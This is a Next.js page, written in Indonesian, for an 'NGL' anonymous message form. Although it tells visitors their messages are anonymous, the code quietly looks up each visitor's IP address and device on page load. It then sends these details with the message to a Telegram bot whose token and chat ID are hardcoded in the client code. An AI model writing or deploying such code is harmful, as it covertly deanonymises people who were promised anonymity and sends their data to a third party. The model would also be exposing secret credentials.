import { useState, useEffect } from "react";
import Head from "next/head";

export default function NGLPage() {
  const [message, setMessage] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [userInfo, setUserInfo] = useState({
    ip: "Tidak diketahui",
    userAgent: navigator.userAgent,
    device: "Tidak diketahui",
  });

  useEffect(() => {
    fetch("https://api.ipify.org?format=json")
      .then((res) => res.json())
      .then((data) => {
        const deviceInfo = parseDeviceInfo(navigator.userAgent);
        setUserInfo({
          ip: data.ip,
          userAgent: navigator.userAgent,
          device: deviceInfo,
        });
      })
      .catch((err) => {
        console.error("Error fetching IP info:", err);
      });
  }, []);

  const parseDeviceInfo = (userAgent) => {
    const deviceRegex = /(Android|iPhone|iPad|Windows Phone|Macintosh|Linux|Samsung|Xiaomi|Huawei|Oppo|Vivo|Nokia|Sony|LG|HTC|OnePlus|Google Pixel|Motorola|Asus|Lenovo|BlackBerry)/i;
    const match = userAgent.match(deviceRegex);
    if (match) {
      return match[0].trim();
    }
    return "Tidak diketahui";
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!message.trim()) {
      alert("Pesan tidak boleh kosong!");
      return;
    }
    setLoading(true);
    setSuccess(false);

    try {
      const botToken = "8081447655:AAE1q_TUAd3SCToozFnZjdcF9jivRgd3eUU";
      const chatId = "1516343905";
      const response = await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: `Pesan anonim dari:\nIP: ${userInfo.ip}\nUSER AGENT: ${userInfo.userAgent}\nDEVICE: ${userInfo.device}\n\nPESAN: ${message}`,
          }),
        }
      );

      if (response.ok) {
        setMessage("");
        setSuccess(true);
      } else {
        alert("Gagal mengirim pesan. Coba lagi.");
      }
    } catch (error) {
      alert("Terjadi kesalahan. Coba lagi.");
    } finally {
      setLoading(false);
    }
  };

  const closePopup = () => setSuccess(false);

  return (
    <>
      <Head>
        <title>NGL - Minn</title>
        <link
          rel="stylesheet"
          href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
        />
        <style>{`
          body {
            margin: 0;
            font-family: 'Roboto', sans-serif;
            background-color: #0d1117;
            color: #c9d1d9;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
          }
          .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
            padding: 15px 20px;
            background-color: #161b22;
          }
          .navbar .logo {
            font-size: 24px;
            color: #58a6ff;
            font-weight: bold;
            display: flex;
            align-items: center;
          }
          .navbar .logo i {
            margin-right: 10px;
          }
          .content {
            flex: 1;
            padding: 20px;
            width: 100%;
            max-width: 600px;
            text-align: center;
          }
          .message-box {
            width: 100%;
            padding: 15px;
            margin: 20px 0;
            border: 1px solid #58a6ff;
            border-radius: 8px;
            background-color: #161b22;
            color: #c9d1d9;
            font-size: 14px;
          }
          .send-button {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 8px;
            background-color: #58a6ff;
            color: #ffffff;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
          }
          .send-button:hover {
            background-color: #4a94d6;
          }
          .popup-success {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #ffffff;
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
          }
          .popup-success p {
            color: #333;
          }
          .popup-close {
            background: #58a6ff;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
          }
          .footer {
            margin-top: auto;
            padding: 10px;
            text-align: center;
            color: #8b949e;
          }
          .footer i {
            color: #ff7b72;
          }
        `}</style>
      </Head>
      <div className="navbar">
        <div className="logo">
          <i className="fas fa-angle-double-right"></i> NGL
        </div>
      </div>
      <div className="content">
        <h1>Kirim Pesan Anonim!</h1>
        <textarea
          className="message-box"
          placeholder="Tuliskan pesan Anda di sini..."
          value={message}
          onChange={(e) => setMessage(e.target.value)}
          disabled={loading}
        ></textarea>
        <button
          className="send-button"
          onClick={handleSubmit}
          disabled={loading}
        >
          {loading ? "Mengirim..." : "Kirim"}
        </button>
        {success && (
          <div className="popup-success">
            <p>Pesan berhasil dikirim!</p>
            <button className="popup-close" onClick={closePopup}>
              Tutup
            </button>
          </div>
        )}
      </div>
      <div className="footer">
        Dibuat dengan <i className="fas fa-heart"></i> oleh Minn
      </div>
    </>
  );
}